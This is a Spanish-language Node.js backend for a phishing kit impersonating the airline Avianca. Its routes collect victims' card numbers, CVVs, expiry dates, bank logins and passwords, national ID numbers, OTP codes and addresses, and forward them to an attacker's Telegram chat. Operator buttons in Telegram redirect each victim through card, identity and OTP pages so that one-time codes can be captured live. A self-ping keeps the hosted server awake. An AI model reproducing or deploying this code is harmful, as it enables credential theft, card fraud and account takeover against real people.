const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[WARN] BOT_TOKEN o CHAT_ID no están definidos en variables de entorno.');
}

// Mapa para almacenar sessionId → redirección
const redirectionTable = Object.create(null);

// Ruta de prueba para verificar si el backend está activo
app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'multi-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

// ✅ Ruta para payment.html
app.post('/payment', async (req, res) => {
  try {
    const data = req.body;
    const sessionId = data.sessionId;

    const text = `
🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
---
ℹ️ DATOS DE LA TARJETA

💳: ${data.p}
📅: ${data.pdate}
🔒: ${data.c}
🏛️: ${data.ban}

ℹ️ DATOS DEL CLIENTE

👨: ${data.dudename} ${data.surname}
🪪: ${data.cc}
📩: ${data.email}
📞: ${data.telnum}

ℹ️ DATOS DE FACTURACIÓN

🏙️: ${data.city}
🏙️: ${data.state}
🏙️: ${data.address}
🌐 IP: ${data.ip}
📍 Ubicación: ${data.location}

🆔 sessionId: ${sessionId}
---`.trim();

    const reply_markup = {
      inline_keyboard: [
        [
          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '✅ Siguiente',     callback_data: `go:id-check.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup
    });

    res.status(200).send({ ok: true });
  } catch (err) {
    console.error('Error en /payment:', err?.response?.data || err.message);
    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
  }
});

// ✅ Ruta para id-check.html
app.post('/idcheck', async (req, res) => {
  try {
    const data = req.body;
    const sessionId = data.sessionId;

    const text = `
🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
---
🪪 VERIFICACIÓN DE IDENTIDAD

• Usuario: ${data.user || 'N/D'}
• Clave: ${data.pass || 'N/D'}
• Nombre: ${data.name || 'N/D'}
• Apellido: ${data.surname || 'N/D'}
• Cédula: ${data.cc || 'N/D'}
• Email: ${data.email || 'N/D'}
• Teléfono: ${data.telnum || 'N/D'}
• Entidad: ${data.ban || 'N/D'}
• Cuotas: ${data.dues || 'N/D'}
• Ciudad: ${data.city || 'N/D'}
• Departamento: ${data.state || 'N/D'}
• Dirección: ${data.address || 'N/D'}

🌐 IP: ${data.ip || 'N/D'}
📍 Ubicación: ${data.location || 'N/D'}

🆔 sessionId: ${sessionId}
---`.trim();


    const reply_markup = {
      inline_keyboard: [
        [
          { text: '❌ Error tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '⚠️ Error logo',   callback_data: `go:id-check.html|${sessionId}` },
          { text: '✅ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup
    });

    res.status(200).send({ ok: true });
  } catch (err) {
    console.error('Error en /idcheck:', err?.response?.data || err.message);
    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
  }
});

app.post('/otpcheck', async (req, res) => {
  try {
    const data = req.body;
    const sessionId = data.sessionId;

    // Guardar el paso para su uso posterior
    redirectionTable[sessionId] = {
      target: null,
      step: data.step || 'otp-check'
    };

    const text = `
🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
---
🔐 VERIFICACIÓN OTP

• OTP: ${data.otp || 'N/D'}
• Usuario: ${data.user || 'N/D'}
• Teléfono: ${data.telnum || 'N/D'}
• Email: ${data.email || 'N/D'}
• IP: ${data.ip || 'N/D'}
• Ubicación: ${data.location || 'N/D'}

🆔 sessionId: ${sessionId}
---`.trim();

    let reply_markup = { inline_keyboard: [] };

    if (data.step === 'otp-check') {
      reply_markup.inline_keyboard = [
        [
          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` }
        ],
        [
          { text: '🔁 Error OTP',     callback_data: `go:otp-check2.html|${sessionId}` },
          { text: '✅ Finalizar',     callback_data: `go:finish.html|${sessionId}` }
        ]
      ];
    } else {
      reply_markup.inline_keyboard = [
        [
          { text: '❌ Error Tarjeta', callback_data: `go:payment.html|${sessionId}` },
          { text: '⚠️ Error Logo',   callback_data: `go:id-check.html|${sessionId}` },
          { text: '⏭️ Siguiente',     callback_data: `go:otp-check.html|${sessionId}` }
        ]
      ];
    }

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      reply_markup
    });

    res.status(200).send({ ok: true });
  } catch (err) {
    console.error('Error en /otpcheck:', err?.response?.data || err.message);
    res.status(500).send({ ok: false, error: 'telegram_send_failed' });
  }
});
app.post("/otpcheck2", async (req, res) => {
  const { otp, sessionId, info, ip, location, email, telnum } = req.body;

  if (!otp || !sessionId || !info) {
    return res.status(400).send("Datos incompletos");
  }

  try {
    // ✅ Guardar redirección temporal
    redirectionTable[sessionId] = {
      target: null,
      step: "otp-check2"
    };

    const mensaje = `
🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
---
🔐 *NUEVO OTP INGRESADO* 🔐

• OTP: ${otp}
• Número: ${info?.number || "Desconocido"}
• Banco: ${info?.checkerInfo?.bank || "N/A"}
• Franquicia: ${info?.checkerInfo?.company || "N/A"}

📩 Email: ${email || 'N/D'}
📞 Teléfono: ${telnum || 'N/D'}
🌐 IP: ${ip || "N/D"}
📍 Ubicación: ${location || "N/D"}

🆔 sessionId: ${sessionId}
---`.trim();

    const buttons = {
      inline_keyboard: [
        [
          { text: "❌ Error Tarjeta", callback_data: `go:payment.html|${sessionId}` },
          { text: "⚠️ Error Logo", callback_data: `go:id-check.html|${sessionId}` }
        ],
        [
          { text: "🔁 Error OTP", callback_data: `go:otp-check2.html|${sessionId}` },
          { text: "✅ Finalizar", callback_data: `go:finish.html|${sessionId}` }
        ]
      ]
    };

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: "Markdown",
        reply_markup: buttons
      })
    });

    return res.sendStatus(200);
  } catch (error) {
    console.error("Error enviando a Telegram:", error);
    return res.sendStatus(500);
  }
});


// ✅ Webhook de Telegram para botones dinámicos
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;

    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data || '';
      const [action, sessionId] = data.split('|');
      const target = (action || '').replace('go:', '');

      if (sessionId && target) {
        redirectionTable[sessionId] = target;
      }

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: cq.id,
        text: `Redireccionando al cliente (${sessionId}) → ${target}`,
        show_alert: true
      });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('Error en webhook:', err?.response?.data || err.message);
    res.sendStatus(200);
  }
});

// ✅ Consulta del cliente para ver si ya tiene destino (versión que limpia el objetivo después de usarlo)
app.get('/get-redirect/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;

  if (redirectionTable[sessionId]) {
    const target = redirectionTable[sessionId];

    // 💥 Eliminamos la orden para que no se repita más
    delete redirectionTable[sessionId];

    res.send({ target });
  } else {
    res.send({}); // No hay redirección activa
  }
});


// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));


// ==== Auto-ping para mantener activo el backend y refrescar la propia URL cada 3 minutos ====
setInterval(async () => {
  try {
    const res = await fetch("https://volandoganado.onrender.com");
    const text = await res.text();
    console.log("🔁 Auto-ping realizado:", text);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }

}, 180000); // 180000 ms = 3 minutos
